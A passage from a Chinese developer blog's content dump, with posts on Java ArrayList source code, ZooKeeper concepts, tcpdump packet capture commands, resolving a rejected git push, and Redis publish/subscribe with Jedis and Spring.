&gt;&gt; 1); if (newCapacity - minCapacity &lt; 0) newCapacity = minCapacity; //超过最大容量值,扩容至Integer的最大值 if (newCapacity - MAX_ARRAY_SIZE &gt; 0) newCapacity = hugeCapacity(minCapacity); // minCapacity is usually close to size, so this is a win: elementData = Arrays.copyOf(elementData, newCapacity); &#125; //大容量,容量值小于0抛出异常,容量值大于最大数组长度返回Integer的最大值2^31-1 private static int hugeCapacity(int minCapacity) &#123; if (minCapacity &lt; 0) // overflow throw new OutOfMemoryError(); return (minCapacity &gt; MAX_ARRAY_SIZE) ? Integer.MAX_VALUE : MAX_ARRAY_SIZE; &#125; add(int index, E element) 12345678910111213141516171819202122232425262728293031//指定位置添加元素public void add(int index, E element) &#123; //边界检查 rangeCheckForAdd(index); //扩容 ensureCapacityInternal(size + 1); //将指定位置后的元素复制到扩容后的元素集合中 System.arraycopy(elementData, index, elementData, index + 1, size - index); //指定位置赋值 elementData[index] = element; size++; &#125;//边界检查 private void rangeCheckForAdd(int index) &#123; if (index &gt; size || index &lt; 0) throw new IndexOutOfBoundsException(outOfBoundsMsg(index)); &#125; /* @param src the source array. * @param srcPos starting position in the source array. * @param dest the destination array. * @param destPos starting position in the destination data. * @param length the number of array elements to be copied. */ //将src的srcPos的连续length个元素复制到dest的destPos的连续位置(替换) public static native void arraycopy(Object src, int srcPos, Object dest, int destPos, int length); add 集合 123456789public boolean addAll(Collection&lt;? extends E&gt; c) &#123; Object[] a = c.toArray(); int numNew = a.length; ensureCapacityInternal(size + numNew); // Increments modCount //将集合元素追加到elementData后 System.arraycopy(a, 0, elementData, size, numNew); size += numNew; return numNew != 0; &#125; 指定位置添加集合 12345678910111213141516171819public boolean addAll(int index, Collection&lt;? extends E&gt; c) &#123; //边界检查 rangeCheckForAdd(index); Object[] a = c.toArray(); int numNew = a.length; //扩容 ensureCapacityInternal(size + numNew); // Increments modCount //计算要移动的元素数量 int numMoved = size - index; if (numMoved &gt; 0) //先将指定位置后的元素copy移动后指定位置的元素 System.arraycopy(elementData, index, elementData, index + numNew, numMoved); //将空出来的元素用添加的集合参数赋值 System.arraycopy(a, 0, elementData, index, numNew); size += numNew; return numNew != 0; &#125; 上图,更直观一点: remove 指定索引位置的元素 123456789101112131415161718public E remove(int index) &#123; //边界检查 rangeCheck(index); //增加修改次数 modCount++; //获取指定索引位置的元素 E oldValue = elementData(index); //需要移动的元素的数量 int numMoved = size - index - 1; if (numMoved &gt; 0) //将index后的元素向前移动一位 System.arraycopy(elementData, index+1, elementData, index, numMoved); //size减1,最后一个元素赋值null,等待GC处理 elementData[--size] = null; // clear to let GC do its work //返回删除的元素 return oldValue; &#125; remove指定的元素 123456789101112131415161718192021222324252627//遍历删除指定的元素public boolean remove(Object o) &#123; if (o == null) &#123; for (int index = 0; index &lt; size; index++) if (elementData[index] == null) &#123; fastRemove(index); return true; &#125; &#125; else &#123; for (int index = 0; index &lt; size; index++) if (o.equals(elementData[index])) &#123; fastRemove(index); return true; &#125; &#125; return false; &#125;//快速移除private void fastRemove(int index) &#123; modCount++; int numMoved = size - index - 1; if (numMoved &gt; 0) System.arraycopy(elementData, index+1, elementData, index, numMoved); elementData[--size] = null; // clear to let GC do its work &#125; set 123456789public E set(int index, E element) &#123; //边界检查 rangeCheck(index); E oldValue = elementData(index); //赋新值 elementData[index] = element; return oldValue; &#125; get 123456public E get(int index) &#123; //边界检查 rangeCheck(index); //返回指定索引元素 return elementData(index); &#125; indexOf 12345678910111213//遍历获取第一个元素的索引,找不到返回-1public int indexOf(Object o) &#123; if (o == null) &#123; for (int i = 0; i &lt; size; i++) if (elementData[i]==null) return i; &#125; else &#123; for (int i = 0; i &lt; size; i++) if (o.equals(elementData[i])) return i; &#125; return -1; &#125; contains 1234//索引大于0即为包含指定元素public boolean contains(Object o) &#123; return indexOf(o) &gt;= 0; &#125; trimToSize 将容量和实际数组元素个数保持一致,删除扩容的null元素.123456789public void trimToSize() &#123; modCount++; if (size &lt; elementData.length) &#123; elementData = (size == 0) ? EMPTY_ELEMENTDATA : Arrays.copyOf(elementData, size); &#125; &#125; retainAll 获取两个集合的交集 1234567891011121314151617181920212223242526272829303132333435363738 public boolean retainAll(Collection&lt;?&gt; c) &#123; Objects.requireNonNull(c); return batchRemove(c, true); &#125;private boolean batchRemove(Collection&lt;?&gt; c, boolean complement) &#123; final Object[] elementData = this.elementData; int r = 0, w = 0; boolean modified = false; try &#123; for (; r &lt; size; r++) if (c.contains(elementData[r]) == complement) //如果包含元素直接赋值 elementData[w++] = elementData[r]; &#125; finally &#123; // Preserve behavioral compatibility with AbstractCollection, // even if c.contains() throws. //如果循环异常中断,正常情况下r==size if (r != size) &#123; System.arraycopy(elementData, r, elementData, w, size - r); w += size - r; &#125; //如果w!=size ,将w后的元素赋值为null if (w != size) &#123; // clear to let GC do its work for (int i = w; i &lt; size; i++) elementData[i] = null; modCount += size - w; size = w; modified = true; &#125; &#125; return modified; &#125; iterator 迭代12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273public Iterator&lt;E&gt; iterator() &#123; return new Itr(); &#125; private class Itr implements Iterator&lt;E&gt; &#123; int cursor; // index of next element to return int lastRet = -1; // index of last element returned; -1 if no such int expectedModCount = modCount; //是否还有下一个元素 public boolean hasNext() &#123; return cursor != size; &#125; //获取下一个元素 @SuppressWarnings(\"unchecked\") public E next() &#123; checkForComodification(); int i = cursor; if (i &gt;= size) throw new NoSuchElementException(); Object[] elementData = ArrayList.this.elementData; if (i &gt;= elementData.length) throw new ConcurrentModificationException(); cursor = i + 1; return (E) elementData[lastRet = i]; &#125; //删除元素 public void remove() &#123; if (lastRet &lt; 0) throw new IllegalStateException(); checkForComodification(); try &#123; ArrayList.this.remove(lastRet); cursor = lastRet; lastRet = -1; expectedModCount = modCount; &#125; catch (IndexOutOfBoundsException ex) &#123; throw new ConcurrentModificationException(); &#125; &#125; @Override @SuppressWarnings(\"unchecked\") public void forEachRemaining(Consumer&lt;? super E&gt; consumer) &#123; Objects.requireNonNull(consumer); final int size = ArrayList.this.size; int i = cursor; if (i &gt;= size) &#123; return; &#125; final Object[] elementData = ArrayList.this.elementData; if (i &gt;= elementData.length) &#123; throw new ConcurrentModificationException(); &#125; while (i != size &amp;&amp; modCount == expectedModCount) &#123; consumer.accept((E) elementData[i++]); &#125; // update once at end of iteration to reduce heap write traffic cursor = i; lastRet = i - 1; checkForComodification(); &#125; //检查修改 final void checkForComodification() &#123; if (modCount != expectedModCount) throw new ConcurrentModificationException(); &#125; &#125; subList 123456789101112131415161718192021222324252627public List&lt;E&gt; subList(int fromIndex, int toIndex) &#123; subListRangeCheck(fromIndex, toIndex, size); return new SubList(this, 0, fromIndex, toIndex); &#125; //边界检查 static void subListRangeCheck(int fromIndex, int toIndex, int size) &#123; if (fromIndex &lt; 0) throw new IndexOutOfBoundsException(\"fromIndex = \" + fromIndex); if (toIndex &gt; size) throw new IndexOutOfBoundsException(\"toIndex = \" + toIndex); if (fromIndex &gt; toIndex) throw new IllegalArgumentException(\"fromIndex(\" + fromIndex + \") &gt; toIndex(\" + toIndex + \")\"); &#125; //内部类 SubList(AbstractList&lt;E&gt; parent, int offset, int fromIndex, int toIndex) &#123; this.parent = parent; this.parentOffset = fromIndex; this.offset = offset + fromIndex; this.size = toIndex - fromIndex; this.modCount = ArrayList.this.modCount; &#125; sort 只需要知道sort内部是归并排序和Tim Sort即可.此处不展开详细的排序算法. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122public void sort(Comparator&lt;? super E&gt; c) &#123; final int expectedModCount = modCount; Arrays.sort((E[]) elementData, 0, size, c); if (modCount != expectedModCount) &#123; throw new ConcurrentModificationException(); &#125; modCount++; &#125; public static &lt;T&gt; void sort(T[] a, int fromIndex, int toIndex, Comparator&lt;? super T&gt; c) &#123; if (c == null) &#123; sort(a, fromIndex, toIndex); &#125; else &#123; rangeCheck(a.length, fromIndex, toIndex); if (LegacyMergeSort.userRequested) legacyMergeSort(a, fromIndex, toIndex, c); else TimSort.sort(a, fromIndex, toIndex, c, null, 0, 0); &#125; &#125; // legacyMergeSort private static &lt;T&gt; void legacyMergeSort(T[] a, int fromIndex, int toIndex, Comparator&lt;? super T&gt; c) &#123; T[] aux = copyOfRange(a, fromIndex, toIndex); if (c==null) mergeSort(aux, a, fromIndex, toIndex, -fromIndex); else mergeSort(aux, a, fromIndex, toIndex, -fromIndex, c); &#125; //mergeSort 归并排序 private static void mergeSort(Object[] src, Object[] dest, int low, int high, int off) &#123; int length = high - low; // Insertion sort on smallest arrays if (length &lt; INSERTIONSORT_THRESHOLD) &#123; for (int i=low; i&lt;high; i++) for (int j=i; j&gt;low &amp;&amp; ((Comparable) dest[j-1]).compareTo(dest[j])&gt;0; j--) swap(dest, j, j-1); return; &#125; // Recursively sort halves of dest into src int destLow = low; int destHigh = high; low += off; high += off; int mid = (low + high) &gt;&gt;&gt; 1; mergeSort(dest, src, low, mid, -off); mergeSort(dest, src, mid, high, -off); // If list is already sorted, just copy from src to dest. This is an // optimization that results in faster sorts for nearly ordered lists. if (((Comparable)src[mid-1]).compareTo(src[mid]) &lt;= 0) &#123; System.arraycopy(src, low, dest, destLow, length); return; &#125; // Merge sorted halves (now in src) into dest for(int i = destLow, p = low, q = mid; i &lt; destHigh; i++) &#123; if (q &gt;= high || p &lt; mid &amp;&amp; ((Comparable)src[p]).compareTo(src[q])&lt;=0) dest[i] = src[p++]; else dest[i] = src[q++]; &#125; &#125; ///TimSort.sort static &lt;T&gt; void sort(T[] a, int lo, int hi, Comparator&lt;? super T&gt; c, T[] work, int workBase, int workLen) &#123; assert c != null &amp;&amp; a != null &amp;&amp; lo &gt;= 0 &amp;&amp; lo &lt;= hi &amp;&amp; hi &lt;= a.length; int nRemaining = hi - lo; if (nRemaining &lt; 2) return; // Arrays of size 0 and 1 are always sorted // If array is small, do a \"mini-TimSort\" with no merges if (nRemaining &lt; MIN_MERGE) &#123; int initRunLen = countRunAndMakeAscending(a, lo, hi, c); binarySort(a, lo, hi, lo + initRunLen, c); return; &#125; /** * March over the array once, left to right, finding natural runs, * extending short natural runs to minRun elements, and merging runs * to maintain stack invariant. */ TimSort&lt;T&gt; ts = new TimSort&lt;&gt;(a, c, work, workBase, workLen); int minRun = minRunLength(nRemaining); do &#123; // Identify next run int runLen = countRunAndMakeAscending(a, lo, hi, c); // If run is short, extend to min(minRun, nRemaining) if (runLen &lt; minRun) &#123; int force = nRemaining &lt;= minRun ? nRemaining : minRun; binarySort(a, lo, lo + force, lo + runLen, c); runLen = force; &#125; // Push run onto pending-run stack, and maybe merge ts.pushRun(lo, runLen); ts.mergeCollapse(); // Advance to find next run lo += runLen; nRemaining -= runLen; &#125; while (nRemaining != 0); // Merge all remaining runs to complete sort assert lo == hi; ts.mergeForceCollapse(); assert ts.stackSize == 1; &#125; 总结 初始容量为10 动态扩容容量为 old + old/2 随机查找效率较高 插入和删除慢,需要移动元素 排序用归并排序和TimSort 动态删除元素会抛出异常,可用迭代器实现 线程不安全 参考 JVM规范-官网 JAVA Bugs -官网 TimSort merge Sort 如有错误,欢迎批评指正,望不吝赐教!!!","updated":"2020-07-19T00:23:27.860Z","tags":[{"name":"java","slug":"java","permalink":"http://xwolf191.github.io/tags/java/"}]},{"title":"zookeeper基础","date":"2018-05-28T10:30:00.000Z","path":"2018/05/28/distributed/zookeeper 基础/","text":"ZooKeeper是一个分布式的,开放源码的分布式应用程序协调服务,是Google的Chubby一个开源的实现,是Hadoop和Hbase的重要组件。它是一个为分布式应用提供一致性服务的软件,提供的功能包括：配置维护、域名服务、分布式同步、组服务等。ZooKeeper的目标就是封装好复杂易出错的关键服务,将简单易用的接口和性能高效、功能稳定的系统提供给用户。ZooKeeper提供了分布式独享锁、选举、队列的接口。 zookeeper设计目标 简单 ZooKeeper允许分布式进程通过共享的层级命名空间相互协调,该命名空间的组织方式与标准文件系统类似。名称空间由数据寄存器组成,在ZooKeeper中称为znodes。与专为存储而设计的典型文件系统不同,ZooKeeper数据保存在内存中,这意味着ZooKeeper可以实现高吞吐量和低延迟数量。ZooKeeper实现非常重视高性能,高可用性,严格有序的访问。ZooKeeper的性能方面意味着它可以在大型分布式系统中使用。可靠性方面使其不会成为单点故障。严格的排序意味着可以在客户端实现复杂的同步原语。 高可用 与它协调的分布式进程一样,ZooKeeper本身也可以在称为集合的一组主机上进行复制。组成ZooKeeper服务的服务器必须彼此了解。它们维护内存中的状态图像,以及持久性存储中的事务日志和快照。只要大多数服务器可用,ZooKeeper服务就可用。客户端连接到单个ZooKeeper服务器。客户端维护TCP连接,通过该连接发送请求,获取响应,获取监视事件以及发送心跳。如果与服务器的TCP连接中断,则客户端将连接到其他服务器。 有序 ZooKeeper使用反映ZooKeeper事务顺序的数字来标记每个更新。后续操作可以使用该顺序来实现更高级别的抽象,例如同步原语。 高效 它在“读取主导”工作负载中特别快。ZooKeeper应用程序在数千台计算机上运行,​​并且在读取比写入更常见的情况下表现最佳,比率大约为10：1。 数据模型和命名空间数据模型和命名空间ZooKeeper提供的名称空间非常类似于标准文件系统。名称是由斜杠（/）分隔的路径元素序列。ZooKeeper名称空间中的每个节点都由路径标识。 每个子目录项如app1都被称作为znode,这个znode是被它所在的路径唯一标识,如c1这个znode的标识为/app1/c1. znode可以有子节点目录,并且每个 znode 可以存储数据,注意EPHEMERAL 类型的目录节点不能有子节点目录. znode是有版本的,每个znode中存储的数据可以有多个版本,也就是一个访问路径中可以存储多份数据. znode可以是临时节点,一旦创建这个znode的客户端与服务器失去联系,这个znode也将自动删除, Zookeeper的客户端和服务器通信采用长连接方式,每个客户端和服务器通过心跳来保持连接,这个连接状态称为session,如果znode是临时节点,这个session失效, znode也就删除了. znode的目录名可以自动编号,如 App1已经存在,再创建的话,将会自动命名为app2. znode可以被监控,包括这个目录节点中存储的数据的修改,子节点目录的变化等,一旦变化可以通知设置监控的客户端,这个是Zookeeper的核心特性, Zookeeper的很多功能都是基于这个特性实现的,后面在具体的应用场景中会有实例介绍。 znode类型当前3.4.13版本的zookeeper的节点类型共有下面四种。 PERSISTENT 持久化目录节点,客户端与zookeeper断开连接后,该节点依旧存在. PERSISTENT_SEQUENTIAL 持久化顺序编号目录节点,客户端与zookeeper断开连接后,该节点依旧存在,只是Zookeeper给该节点名称进行顺序编号； EPHEMERAL 临时目录节点,客户端与zookeeper断开连接后,该节点被删除； EPHEMERAL_SEQUENTIAL 临时顺序编号目录节点,客户端与zookeeper断开连接后,该节点被删除,只是Zookeeper给该节点名称进行顺序编号。 zookeeper中的角色在zookeeper中有下面几种角色,以及每个角色的职责. zookeeper工作原理Zookeeper 的核心是原子广播,这个机制保证了各个Server之间的同步。实现这个机制的协议叫做Zab协议(Zookeeper Atomic Broadcast)。Zab协议有两种模式,它们分别是恢复模式（选主）和广播模式（同步）。当服务启动或者在领导者崩溃后,Zab就进入了恢复模式,当领导者被选举出来,且大多数Server完成了和 leader的状态同步以后,恢复模式就结束了。状态同步保证了leader和Server具有相同的系统状态。 为了保证事务的顺序一致性,zookeeper采用了递增的事务id号（zxid）来标识事务。所有的提议（proposal）都在被提出的时候加上了zxid。实现中zxid是一个64位的数字,它高32位是epoch用来标识leader关系是否改变,每次一个leader被选出来,它都会有一个新的epoch,标识当前属于那个leader的统治时期。低32位用于递增计数。 server的工作状态 LOOKING 当前Server不知道leader是谁,正在选举 LEADING 当前Server即为选举出来的leader FOLLOWING leader已经选举出来,当前Server与之同步 OBSERVING 当前server为选举出的observer Watcher机制Watcher 监听机制是 Zookeeper 中非常重要的特性，我们基于 zookeeper 上创建的节点，可以对这些节点绑定监听事件，比如可以监听节点数据变更、节点删除、子节点状态变更等事件，通过这个事件机制，可以基于 zookeeper实现分布式锁、集群管理等功能。 watcher 特性：当数据发生变化的时候,zookeeper会产生一个 watcher 事件，并且会发送到客户端。但是客户端只会收到一次通知。如果后续这个节点再次发生变化，那么之前设置 watcher 的客户端不会再次收到消息.(watcher 是一次性的操作)。 可以通过循环监听去达到永久监听效果。 ACLzookeeper的节点有5种操作权限： CREATE、READ、WRITE、DELETE、ADMIN 也就是 增、删、改、查、管理权限,这5种权限简写为crwda(即：每个单词的首字符缩写).注：这5种权限中,delete是指对子节点的删除权限,其它4种权限指对自身节点的操作权限 身份的认证有4种方式： world 默认方式,相当于全世界都能访问 Digest即用户名:密码这种方式认证,这也是业务系统中最常用的 ip 使用Ip地址认证 Super 超级用户,和Digest类型,具有对zookeeper节点的任意操作权限。 客户端工具 zkClient Zookeeper的Watcher是一次性的,每次触发之后都需要重新进行注册； Session超时之后没有实现重连机制； 异常处理繁琐,Zookeeper提供了很多异常,对于开发人员来说可能根本不知道该如何处理这些异常信息； 只提供了简单的byte[]数组的接口,没有提供针对对象级别的序列化； 创建节点时如果节点存在抛出异常,需要自行检查节点是否存在； 删除节点无法实现级联删除； curator Curator是Netflix公司开源的一套Zookeeper客户端框架,ZkClient一样,解决了非常底层的细节开发工作,包括连接重连、反复注册Watcher和NodeExistsException异常等。目前已经成为Apache的顶级项目。另外还提供了一套易用性和可读性更强的Fluent风格的客户端API框架。除此之外,Curator中还提供了Zookeeper各种应用场景的抽象封装。 使用场景下面列举几个场景。 配置中心zookeeper的节点可以保存数据,通过将配置信息存入node中。客户端通过watcher机制监控数据变化同时更业务系统的相关配置信息. 注册中心注册中心通过zookeeper的临时节点来注册服务提供者和消费者等信息,当对应的服务宕机后对应的节点也从zookeeper中移除。这样就可以知道服务提供者、消费者的服务状态信息。 集群管理服务集群管理主要涉及下面的几方面: 服务状态信息 服务上、下线信息 服务列表信息 这些都可以通过zookeeper的临时节点来判断服务的上下线以及节点的数量来判断集群的数量. 分布式锁在单机系统中实现锁是很容易的,通过Lock或synchronized可以很方便的实现。但是在分布式系统中实现对一组公共资源加锁仍然使用以前的方式却不能实现。所以引入了zookeeper,在zookeeper中通过创建临时节点来达到持有锁的目的,当服务处理完成业务后主动删除节点。其他服务判断当前临时节点是否存在来判断锁是否已被持有。 参考资料 Apache Zookeeper官网","updated":"2020-07-19T00:23:27.831Z","tags":[{"name":"zookeeper","slug":"zookeeper","permalink":"http://xwolf191.github.io/tags/zookeeper/"}]},{"title":"linux tcpdump抓包","date":"2018-05-23T03:30:00.000Z","path":"2018/05/23/linux/linux tcpdump 抓包/","text":"tcpdump是在命令行下运行的常用数据包分析器。它允许用户显示通过计算机所连接的网络传输或接收的TCP/IP和其他数据包。根据BSD许可分发,tcpdump是免费软件。tcpdump适用于大多数类Unix 操作系统：Linux，Solaris，BSD，macOS，HP-UX，Android和AIX等。在这些系统中,tcpdump使用libpcap库来捕获数据包。Windows的tcpdump 的端口称为WinDump; 它使用WinPcap，libpcap的Windows端口。 —— wiki 安装centos安装 1yum install tcpdump 命令参数123456789101112131415tcpdump -hNAME tcpdump - dump traffic on a networkSYNOPSIS tcpdump [ -AdDefIJKlLnNOpqRStuUvxX ] [ -B buffer_size ] [ -c count ] [ -C file_size ] [ -G rotate_seconds ] [ -F file ] [ -i interface ] [ -j tstamp_type ] [ -m module ] [ -M secret ] [ -Q|-P in|out|inout ] [ -r file ] [ -s snaplen ] [ -T type ] [ -w file ] [ -W filecount ] [ -E spi@ipaddr algo:secret,... ] [ -y datalinktype ] [ -z postrotate-command ] [ -Z user ] [ expression ] 常用命令参数12345678910111213141516171819202122232425262728-A 以ASCII格式打印每个数据包(不包含其链接级别标题）;方便捕捉网页;-B 将操作系统捕获缓冲区大小设置为buffer_size。-d 将匹配信息包的代码以人们能够理解的汇编格式给出;-dd 将匹配信息包的代码以c语言程序段的格式给出;-ddd 将匹配信息包的代码以十进制的形式给出;-e 在输出行打印出数据链路层的头部信息，包括源mac和目的mac，以及网络层的协议;-f 将外部的Internet地址以数字的形式打印出来;-F 使用文件作为过滤器表达式的输入.在命令行上给出的附加表达式将被忽略;-l 使标准输出变为缓冲行形式;-n 指定将每个监听到数据包中的域名转换成IP地址后显示，不把网络地址转换成名字;-nn 指定将每个监听到的数据包中的域名转换成IP、端口从应用名称转换成端口号后显示-t 在输出的每一行不打印时间戳;-tt 在每个转储线上打印未格式化的时间戳;-ttt 在每个转储线上打印当前行和前一行之间的增量(微秒分辨率);-tttt 在每个转储线上按日期打印默认格式的时间戳;-ttttt 在每个转储线上打印当前和第一行之间的增量(微秒分辨率);-v 输出一个稍微详细的信息，例如在ip包中可以包括ttl和服务类型的信息;-vv 输出详细的报文信息;-c 在收到指定的包的数目后，tcpdump就会停止;-F 从指定的文件中读取表达式,忽略其它的表达式;-i 指定监听的网络接口;-p 将网卡设置为非混杂模式，不能与host或broadcast一起使用;-r 从指定的文件中读取包(这些包一般通过-w选项产生);-w 直接将包写入文件中，并不分析和打印出来;-s snaplen snaplen表示从一个包中截取的字节数。0表示包不截断，抓完整的数据包。默认的话tcpdump只显示部分数据包,默认68字节;-T 将监听到的包直接解释为指定的类型的报文，常见的类型有rpc和snmp-X 告诉tcpdump命令,需要把协议头和包内容都原原本本的显示出来(tcpdump会以16进制和ASCII的形式显示),这在进行协议分析时是绝对的利器;-y 设置捕获数据链路类型时使用的数据链路类型; 常用示例 监听eth0网卡HTTP 80端口的request和response 1tcpdump -i eth0 -A -s 0 'tcp port 80 and (((ip[2:2] - ((ip[0]&amp;0xf)&lt;&lt;2)) - ((tcp[12]&amp;0xf0)&gt;&gt;2)) != 0)' 监听eth0网卡HTTP 80端口的request和response,指定来源域名”example.com”，也可以指定具体IP 1tcpdump -i eth0 -A -s 0 'src example.com and tcp port 80 and (((ip[2:2] - ((ip[0]&amp;0xf)&lt;&lt;2)) - ((tcp[12]&amp;0xf0)&gt;&gt;2)) != 0)' 监听本机发送至本机的HTTP 80端口的request和response 1tcpdump -i lo -A -s 0 'tcp port 80 and (((ip[2:2] - ((ip[0]&amp;0xf)&lt;&lt;2)) - ((tcp[12]&amp;0xf0)&gt;&gt;2)) != 0)' HTTP GET request信息 1tcpdump -A -s 0 'tcp[((tcp[12:1] &amp; 0xf0) &gt;&gt; 2):4] = 0x47455420' HTTP POST request信息 1tcpdump -A -s 0 'tcp dst port 80 and (tcp[((tcp[12:1] &amp; 0xf0) &gt;&gt; 2):4] = 0x504f5354)' 包信息123456789101112134:00:01.094570 IP 101.169.176.103.47738 &gt; 10.10.0.1.80: Flags [P.], seq 2971644064:2971644477, ack 4255769542, win 65535, length 413Ed....@.2...yEL.....zm.........P.......POST /password HTTP/1.1Content-Type: application/x-www-form-urlencodedContent-Length: 142Host: 10.10.0.1Connection: Keep-AliveAccept-Encoding: gzipCookie: SESSION=8df0a6d1-3212-492c-871e-3User-Agent: okhttp/3.3.1phone=19900000000&amp;password=123456&amp;sign=MWU1ZDZkZTNhNDVkMDVmOTAzNGIwOTRjODA3ZGI&amp;timestamp=&amp;client_type=A Fiddler图形化查看数据包将数据包保存pack.cap1tcpdump -i eth0 -A -s 0 'tcp port 28080 and (((ip[2:2] - ((ip[0]&amp;0xf)&lt;&lt;2)) - ((tcp[12]&amp;0xf0)&gt;&gt;2)) != 0)' -vv -w /opt/pack.cap 下载到本地,导入fiddler,File-&gt;import sessions-&gt;Packet Capture 即可查看.","updated":"2020-07-19T00:23:27.881Z","tags":[{"name":"linux","slug":"linux","permalink":"http://xwolf191.github.io/tags/linux/"}]},{"title":"git push rejected","date":"2018-05-19T15:25:00.000Z","path":"2018/05/19/开发工具/git push rejected/","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162D:\\workspace\\CLion\\C&gt; git push --set-upstream origin masterfatal: HttpRequestException encountered. 发送请求时出错。Username for 'https://github.com': Password for '':To https://github.com/C.git ! [rejected] master -&gt; master (fetch first)error: failed to push some refs to 'https://github.com/C.git'hint: Updates were rejected because the remote contains work that you dohint: not have locally. This is usually caused by another repository pushinghint: to the same ref. You may want to first integrate the remote changeshint: (e.g., 'git pull ...') before pushing again.hint: See the 'Note about fast-forwards' in 'git push --help' for details.D:\\workspace\\CLion\\C&gt;git pullwarning: no common commitsremote: Counting objects: 3, done.remote: Compressing objects: 100% (2/2), done.remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0Unpacking objects: 100% (3/3), done.From https://github.com/C * [new branch] master -&gt; origin/masterThere is no tracking information for the current branch.Please specify which branch you want to merge with.See git-pull(1) for details. git pull &lt;remote&gt; &lt;branch&gt;If you wish to set tracking information for this branch you can do so with: git branch --set-upstream-to=origin/&lt;branch&gt; masterD:\\workspace\\CLion\\C&gt;git branch --set-upstream-to=origin/master masterBranch 'master' set up to track remote branch 'master' from 'origin'.D:\\workspace\\CLion\\C&gt;git pushfatal: HttpRequestException encountered. 发送请求时出错。Username for 'https://github.com': Password for '':To https://github.com/C.git ! [rejected] master -&gt; master (non-fast-forward)error: failed to push some refs to 'https://github.com/C.git'hint: Updates were rejected because the tip of your current branch is behindhint: its remote counterpart. Integrate the remote changes (e.g.hint: 'git pull ...') before pushing again.hint: See the 'Note about fast-forwards' in 'git push --help' for details.D:\\workspace\\CLion\\C&gt;git push -u origin master -ffatal: HttpRequestException encountered. 发送请求时出错。Username for 'https://github.com': Password for '':Counting objects: 13, done.Delta compression using up to 8 threads.Compressing objects: 100% (10/10), done.Writing objects: 100% (13/13), 1.48 KiB | 505.00 KiB/s, done.Total 13 (delta 0), reused 0 (delta 0)To https://github.com/C.git + 0b30ec0...5ca759a master -&gt; master (forced update)Branch 'master' set up to track remote branch 'master' from 'origin'.","updated":"2020-07-19T00:23:27.968Z","tags":[{"name":"git","slug":"git","permalink":"http://xwolf191.github.io/tags/git/"}]},{"title":"Redis发布订阅","date":"2018-05-11T03:30:00.000Z","path":"2018/05/11/mq/Redis发布订阅/","text":"今天开发一个功能,数据量比较大,而且是单机处理.系统现有1-9这九种奖品,8和9两种数据量比较大,其中9比8多于30%数据左右,初期设计由定时任务处理,一个定时任务全部处理,数据量小的时候还好.数据量大时(处理100W数据),业务涉及订单、奖品、用户金额变动,事物提交占用时间长。会出现锁超时情况比较多.为解决这个问题,打算引入redis发布订阅来解决此问题.1-7处理完成后,redis中放入指定信息。8和9分别订阅此信息,同时开始处理业务。其中8,9也是各自一次处理1000条数据,直至完成. redis发布订阅测试代码配置事件通知类型notify-keyspace-events Ex 配置项参考:123456789101112# K Keyspace events, published with __keyspace@&lt;db&gt;__ prefix.# E Keyevent events, published with __keyevent@&lt;db&gt;__ prefix.# g Generic commands (non-type specific) like DEL, EXPIRE, RENAME, ...# $ String commands# l List commands# s Set commands# h Hash commands# z Sorted set commands# x Expired events (events generated every time a key expires)# e Evicted events (events generated when a key is evicted for maxmemory)# A Alias for g$lshzxe, so that the \"AKE\" string means all the events.# java示例 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556import org.slf4j.Logger;import org.slf4j.LoggerFactory;import redis.clients.jedis.JedisPubSub;import java.util.Arrays; /** * 发布订阅监听 * @author xwolf **/public class PubSubListener extends JedisPubSub &#123; private static final Logger log = LoggerFactory.getLogger(PubSubListener.class); /** * 消息接收 */ @Override public void onMessage(String channel, String message) &#123; log.info(\"onMessage channel=&#123;&#125;,message=&#123;&#125;\",channel,message); super.onMessage(channel, message); &#125; @Override public void onSubscribe(String channel, int subscribedChannels) &#123; log.info(\"onSubscribe channel=&#123;&#125;,subscribedChannels=&#123;&#125;\",channel,subscribedChannels); super.onSubscribe(channel, subscribedChannels); &#125; @Override public void onUnsubscribe(String channel, int subscribedChannels) &#123; log.info(\"onUnsubscribe channel=&#123;&#125;,subscribedChannels=&#123;&#125;\",channel,subscribedChannels); super.onUnsubscribe(channel, subscribedChannels); &#125; @Override public void onPong(String pattern) &#123; log.info(\"onPong pattern=&#123;&#125;\",pattern); super.onPong(pattern); &#125; @Override public void unsubscribe(String... channels) &#123; log.info(\"unsubscribe channel=&#123;&#125;\",Arrays.toString(channels)); super.unsubscribe(channels); &#125; @Override public void ping() &#123; log.info(\"ping\"); super.ping(); &#125; junit Test 1234567891011121314151617181920/** * 订阅指定channel信息 */@Testpublic void test()&#123; Jedis jedis = new Jedis(\"localhost\"); PubSubListener listener = new PubSubListener(); jedis.subscribe(listener, \"test\");&#125;/** * 发送消息到指定channel */@Testpublic void test2() throws Exception&#123; Jedis jedis = new Jedis(\"localhost\"); jedis.publish(\"test\", \"啊呀,...\");&#125; redis的subscribe方法是阻塞的,spring-data-redis中使用RedisMessageListenerContainer来监听消息 12345678910111213141516171819202122232425262728&lt;bean id=\"jedisConnectionFactory\" class=\"org.springframework.data.redis.connection.jedis.JedisConnectionFactory\" p:host-name=\"localhost\" p:port=\"6379\" p:use-pool=\"true\" /&gt; &lt;bean id=\"redisTemplate\" class=\"org.springframework.data.redis.core.RedisTemplate\" p:connection-factory-ref=\"jedisConnectionFactory\"/&gt; &lt;bean id=\"stringRedisTemplate\" class=\"org.springframework.data.redis.core.StringRedisTemplate\" p:connection-factory-ref=\"jedisConnectionFactory\"/&gt; &lt;bean id=\"redisMessageListener\" class=\"com.alqsoft.init.RedisMessageListener\" &gt; &lt;property name=\"redisTemplate\" ref=\"redisTemplate\"/&gt; &lt;/bean&gt; &lt;bean id=\"redisContainer\" class=\"org.springframework.data.redis.listener.RedisMessageListenerContainer\"&gt; &lt;property name=\"connectionFactory\" ref=\"jedisConnectionFactory\" /&gt; &lt;property name=\"messageListeners\"&gt; &lt;map&gt; &lt;entry key-ref=\"redisMessageListener\"&gt; &lt;list&gt; &lt;!-- 匹配所有频道 --&gt; &lt;bean class=\"org.springframework.data.redis.listener.PatternTopic\"&gt; &lt;constructor-arg value=\"*\" /&gt; &lt;/bean&gt; &lt;/list&gt; &lt;/entry&gt; &lt;/map&gt; &lt;/property&gt; 